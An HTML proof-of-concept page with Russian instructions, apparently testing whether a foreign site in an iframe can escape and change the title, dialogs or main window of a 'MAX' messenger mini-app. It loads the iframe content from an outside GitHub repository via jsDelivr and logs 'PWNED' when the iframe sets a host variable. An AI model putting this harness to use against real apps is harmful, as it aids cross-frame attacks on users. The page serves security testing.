<!doctype html>
<html lang="ru">
<head><meta charset="utf-8"><title>V</title>
<style>body{font:15px monospace;margin:12px}
iframe{width:100%;height:230px;border:2px dashed #999;background:#fffbe6}
#log{white-space:pre-wrap;background:#111;color:#9f9;padding:10px;margin-top:10px;border-radius:4px;max-height:300px;overflow:auto}</style>
</head>
<body>
<div>Жёлтая рамка = чужой сайт. Нажимай кнопки 1, 2, 3 ПО ОЧЕРЕДИ и смотри: заголовок окна (кнопка 1), диалог телефона (кнопка 2), основное окно MAX (кнопка 3).</div>
<iframe id="f"></iframe>
<div id="log">ready</div>
<script>(() => {
const RUN=(crypto.randomUUID?crypto.randomUUID().slice(0,8):Math.random().toString(36).slice(2,10));
const logEl=document.getElementById('log');
function log(...a){ logEl.textContent += "\n["+new Date().toTimeString().slice(0,8)+"] "+a.map(x=>String(x)).join(" "); }
log("run:",RUN);
window.WebApp = window.WebApp || { sendEvent: function(n,d){ log("<=", n, d); } };
fetch('https://api.github.com/repos/nbafan00/dl-check/commits?path=child.xhtml&per_page=1')
 .then(r=>r.json()).then(j=>{ document.getElementById('f').src='https://cdn.jsdelivr.net/gh/nbafan00/dl-check@'+j[0].sha+'/child.xhtml'; log('iframe:', j[0].sha.slice(0,8)); })
 .catch(()=>log('github api fail'));
let lastTitle=document.title;
setInterval(()=>{ if(document.title!==lastTitle){ lastTitle=document.title; log("TITLE ИЗМЕНИЛСЯ:", lastTitle); } },300);
setInterval(()=>{ if(window.__fromIframe){ log("PWNED: window.__fromIframe =", window.__fromIframe); window.__fromIframe=undefined; } },300);
})();</script>
</body></html>
